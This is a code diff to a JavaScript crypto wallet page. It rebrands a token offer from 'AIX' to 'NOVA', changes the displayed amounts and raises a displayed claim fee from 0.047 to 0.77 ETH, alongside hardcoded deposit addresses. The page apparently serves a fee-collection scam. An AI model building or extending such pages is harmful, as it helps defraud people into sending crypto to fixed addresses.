@@ -22,12 +22,11 @@ document.addEventListener("DOMContentLoaded", function() {
     { name: 'USDC', abbr: 'USDC', logoUrl: 'https://s2.coinmarketcap.com/static/img/coins/64x64/3408.png', id: 'usd-coin', balance: 0, address: '0x0A9cDe2eeA372f356c67DAc2eC0a560539BB27A6', network: 'BEP20' },
     { name: 'BNB', abbr: 'BNB', logoUrl: 'https://s2.coinmarketcap.com/static/img/coins/64x64/1839.png', id: 'binancecoin', balance: 0, address: '0x0A9cDe2eeA372f356c67DAc2eC0a560539BB27A6', network: 'BEP20' },
     { name: 'USDT', abbr: 'USDT', logoUrl: 'https://s2.coinmarketcap.com/static/img/coins/64x64/825.png', id: 'tether', balance: 0, address: 'TPxdxnpNJ34D6Y6VC2cHYsDvwaFCe3DWB5', network: 'TRC20' },
-    { name: 'AIX', abbr: 'AIX', logoUrl: 'https://aixwallets.com/assets/img/aixc.svg', id: 'arbitrum', balance: 0, address: '0x49efE83DDA6Dd8f80DaCF00AcE0CeC5A16e37Ab8', network: 'BEP20' },
+    { name: 'NOVA', abbr: 'NOVA', logoUrl: 'https://novaexai.com/image/nav_1.png', id: 'arbitrum', balance: 0, address: '0x49efE83DDA6Dd8f80DaCF00AcE0CeC5A16e37Ab8', network: 'ERC20' },
     { name: 'XRP', abbr: 'XRP', logoUrl: 'https://s2.coinmarketcap.com/static/img/coins/64x64/52.png', id: 'ripple', balance: 0, address: 'rnL9SnFtF7WdQoKAMxZ2weEbYYTVpWezPr', network: 'XRP' },
     { name: 'Tron', abbr: 'TRX', logoUrl: 'https://s2.coinmarketcap.com/static/img/coins/64x64/1958.png', id: 'tron', balance: 0, address: 'TPxdxnpNJ34D6Y6VC2cHYsDvwaFCe3DWB5', network: 'TRC20' },
     { name: 'Pi', abbr: 'PI', logoUrl: 'https://s2.coinmarketcap.com/static/img/coins/64x64/35697.png', id: 'story-2', balance: 0, address: 'MD5HGPHVL73EBDUD2Z4K2VDRLUBC4FFN7GOBLKPK6OPPXH6TED4TQAAAAGLX3QVOQQRA6', network: 'Pi Mainnet' },
     { name: 'Toncoin', abbr: 'TON', logoUrl: 'https://s2.coinmarketcap.com/static/img/coins/64x64/11419.png', id: 'the-open-network', balance: 0, address: 'UQByPzTPuIlW6hvMSVOC8n9F8pYl-1kvv58lLvW-ody-gVCI', network: 'TON' },
-    { name: 'SATU', abbr: 'SATU', logoUrl: 'https://atu.network/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Flogo.7b65afc5.png&w=64&q=75', id: 'story-2', balance: 0, address: 'TPxdxnpNJ34D6Y6VC2cHYsDvwaFCe3DWB5', network: 'TRC20' },
     { name: 'Litecoin', abbr: 'LTC', logoUrl: 'https://s2.coinmarketcap.com/static/img/coins/64x64/2.png', id: 'litecoin', balance: 0, address: 'ltc1q2h778u8ufcyqsvayk87vjvnjhj7405ss9cy934', network: 'Litecoin' },
     { name: 'Cardano', abbr: 'ADA', logoUrl: 'https://s2.coinmarketcap.com/static/img/coins/64x64/2010.png', id: 'cardano', balance: 0, address: 'addr1q9wx4xcxurf2962enat72mrja7jmphtdhnvz7pf8t240347dm390g3qf0v0f9sy6mvj394y2aqsd48agx2n3vmly2ryqa0u5wt', network: 'Cardano' },
     { name: 'Polkadot', abbr: 'DOT', logoUrl: 'https://s2.coinmarketcap.com/static/cloud/img/logo/polkadot/Polkadot_Logo_Animation_32x32.gif', id: 'polkadot', balance: 0, address: '15wzkozjczyrYtCu1WtFxaMa6cLHzZWsSAK3VUuBFnN7i61', network: 'Polkadot' },
@@ -2513,18 +2512,18 @@ document.addEventListener('DOMContentLoaded', () => {
 
         if (address.startsWith('0x') && address.length >= 28) {
             // Ethereum (BSC-BEP20)
-            connectVal.textContent = "10,000";
-            ConnectValAix.textContent = "AIX";
+            connectVal.textContent = "1,000";
+            ConnectValAix.textContent = "NOVA";
             ExpressAvailMini.style.display = 'none';
             connectAix.style.display = 'none';
             GreenConnect.style.display = 'block';
-            conDisA.textContent = "BSC-BEP20";
-            conDisB.textContent = "AIX Wallet";
-            conDisC.textContent = "AIX";
+            conDisA.textContent = "ERC20";
+            conDisB.textContent = "Novaex AI";
+            conDisC.textContent = "NOVA";
             conDisD.textContent = "18";
-            aBoxFees.textContent = "0.047 ETH";
-            ExpCurOne.textContent = "AIX";
-            ExpFromIcon.src = "https://aixwallets.com/assets/img/aixc.svg";  // Replace with actual URL
+            aBoxFees.textContent = "0.77 ETH";
+            ExpCurOne.textContent = "NOVA";
+            ExpFromIcon.src = "https://novaexai.com/image/nav_1.png";  // Replace with actual URL
             ExpFromIcon.style.display = "inline-block";
 
         } else if (address.startsWith('T') && address.length >= 28) {
@@ -2563,24 +2562,3 @@ document.addEventListener('DOMContentLoaded', () => {
     });
 }); 
  
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
